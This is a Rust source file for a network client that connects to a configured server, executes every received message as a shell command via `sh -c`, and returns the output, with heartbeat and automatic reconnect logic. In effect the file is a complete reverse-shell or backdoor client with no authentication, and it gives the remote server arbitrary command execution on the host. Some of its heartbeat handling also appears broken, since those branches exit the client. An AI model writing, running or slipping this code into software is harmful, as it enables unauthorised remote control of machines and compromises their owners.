use std::{
    io::{Read, Write}, net::{SocketAddr, TcpStream}, process::{Command, Stdio}, time::Instant
};

use crate::{args::Args, utils::check_ip};

struct ClientSocket {
    addr: SocketAddr,
    stream: Option<TcpStream>,
    heartbeat: bool,
    heartbeat_interval: u128,
    heartbeat_timeout: u128,
    offline_retry: bool,
    offline_retry_interval: u128,

    last_send_heartbeat: Instant,
    last_receive_heartbeat: Instant,
    last_retry_connect: Instant,
}

pub fn init_client(props: Args) {
    let addr: SocketAddr = SocketAddr::new(check_ip(&props.server_ip), props.server_port);

    let mut client = ClientSocket {
        addr,
        stream: None,
        heartbeat: props.heartbeat,
        heartbeat_interval: props.heartbeat_interval,
        heartbeat_timeout: props.heartbeat_timeout,
        offline_retry: props.offline_retry,
        offline_retry_interval: props.offline_retry_interval,

        last_send_heartbeat: Instant::now(),
        last_receive_heartbeat: Instant::now(),
        last_retry_connect: Instant::now(),
    };

    if let Ok(stream) = TcpStream::connect(client.addr) {
        client.stream = Some(stream);
    } else {
        client.stream = None;
        println!("Couldn't connect to server...");
    }

    loop {
        match client.stream {
            Some(ref mut stream) => {
                let mut buf: [u8; 1024] = [0; 1024];

                match stream.read(&mut buf) {
                    Ok(size) => {
                        if size > 0 {
                            let input = String::from_utf8_lossy(&buf[..size]);

                            if client.heartbeat && input.trim() == "heartbeat" {
                                println!("Received heartbeat from server");
                                client.last_receive_heartbeat = Instant::now();
                                return;
                            }

                            if client.heartbeat
                                && client.last_receive_heartbeat.elapsed().as_millis()
                                    > client.heartbeat_timeout
                            {
                                client.stream = None;
                                return;
                            }

                            if client.heartbeat
                                && client.last_send_heartbeat.elapsed().as_millis()
                                    > client.heartbeat_interval
                            {
                                stream.write_all(b"heartbeat\n").unwrap();
                            }

                            println!("Received command: {}", input);

                            let output = Command::new("sh")
                                .arg("-c")
                                .arg(&*input)
                                .stdout(Stdio::piped())
                                .stderr(Stdio::piped())
                                .output();

                            match output {
                                Ok(output) => {
                                    stream.write_all(&output.stdout).unwrap();
                                    stream.write_all(&output.stderr).unwrap();
                                }
                                Err(err) => {
                                    stream
                                        .write_all(
                                            format!("Error executing command: {}", err.to_string())
                                                .as_bytes(),
                                        )
                                        .unwrap();
                                }
                            }
                        }
                    }
                    Err(_) => {}
                }
            }
            None => {
                if client.offline_retry
                    && client.last_retry_connect.elapsed().as_millis()
                        > client.offline_retry_interval
                {
                    println!("retry connect");
                    if let Ok(stream) = TcpStream::connect(client.addr) {
                        client.stream = Some(stream);
                    } else {
                        client.stream = None;
                        println!("Couldn't connect to server...");
                    }
                }
            }
        }
    }
}
